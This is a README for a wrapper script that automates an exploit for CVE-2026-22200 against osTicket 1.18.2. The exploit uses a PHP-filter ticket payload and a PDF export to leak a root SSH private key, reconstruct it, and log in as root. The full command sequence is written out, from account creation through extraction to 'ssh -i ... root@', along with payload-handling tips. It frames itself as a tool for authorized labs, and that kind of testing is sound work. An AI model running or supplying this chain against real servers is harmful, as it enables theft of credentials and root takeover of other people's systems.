# CVE-2026-22200 osTicket SSH-key recovery wrapper

Turnkey wrapper for reproducing CVE-2026-22200 in an authorized osTicket
1.18.2 lab. It uses Horizon3AI's proof of concept and automates:

1. Client-account import and authenticated session creation.
2. Horizon3AI PHP-filter payload generation.
3. Authenticated ticket creation.
4. Ticket PDF export and `%PDF-` validation.
5. Embedded bitmap extraction.
6. OpenSSH-key fragment concatenation.
7. Reconstruction of a truncated Ed25519 key from its complete private seed.
8. Public-key derivation and fingerprint validation.

## Requirements

- Python 3.10 or later
- Horizon3AI's CVE-2026-22200 repository
- Network access to the authorized osTicket target

PyMuPDF's package name is `PyMuPDF`, while its modern import name is
`pymupdf`. The wrapper also supports Horizon3AI versions that still contain
the deprecated `import fitz` statement without producing the deprecation
warning.

## Installation

```bash
git clone https://github.com/horizon3ai/CVE-2026-22200.git
git clone <YOUR-REPOSITORY-URL> cve-2026-22200-turnkey
cd cve-2026-22200-turnkey

python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install -r requirements.txt
```

The wrapper is named `exploit.py` in this repository. If it is published as
`horizon3ai_windyfrost.py`, substitute that filename in the commands below.

## Full workflow

Use a fresh address on a DNS-valid domain. The tested lab rejected
`test.com`, while `example.com` worked. Omit `--password` so the password
is requested interactively and does not enter shell history.

```bash
python exploit.py \
  --base http://192.168.143.104/osticket/ \
  --horizon3-dir ../CVE-2026-22200 \
  --email tester@example.com \
  --unique
```

The default requested file is `/root/.ssh/id_rsa`. In the tested lab that
path contains an OpenSSH Ed25519 key. Override the path with
`--remote-file PATH` when required.

## Resume from an existing PDF

If ticket creation and PDF export succeeded but extraction stopped because a
dependency was missing, reuse the saved PDF. This avoids creating another
account or ticket:

```bash
python exploit.py \
  --horizon3-dir ../CVE-2026-22200 \
  --extract-pdf cve-2026-22200-output/ticket-export.pdf
```

The following Horizon3AI extractor messages are expected in this lab:

- `Error processing image 1: not enough image data` — image 1 is not the
  payload image.
- `B64 decode failed after 234 bytes` — mPDF truncated the extracted key,
  but the complete 32-byte Ed25519 seed was recovered.

Success is established only when the wrapper reports that it reconstructed
the key and validated its SHA-256 public-key fingerprint.

## Output files

All artifacts are written under `cve-2026-22200-output/`:

- `payload.html` — raw Horizon3AI ticket payload
- `ticket-export.pdf` — validated ticket PDF
- `extracted/` — Horizon3AI image and extraction artifacts
- `root_id_rsa.concatenated` — concatenated disclosed key material
- `root_ssh_key` — reconstructed and validated private key

Validate and use the result:

```bash
chmod 600 cve-2026-22200-output/root_ssh_key
ssh-keygen -lf cve-2026-22200-output/root_ssh_key
ssh -i cve-2026-22200-output/root_ssh_key root@192.168.143.104
```

## Payload handling

Do not add another `<ul>...</ul>` wrapper and do not URL-encode the complete
payload. Horizon3AI's generator already supplies the required HTML wrapper
and internal encoding. The wrapper submits the output unchanged in the
multipart `message` field.

## Attribution

This wrapper depends on and invokes Horizon3AI's original proof of concept:
<https://github.com/horizon3ai/CVE-2026-22200>

Use only on systems for which you have explicit authorization.
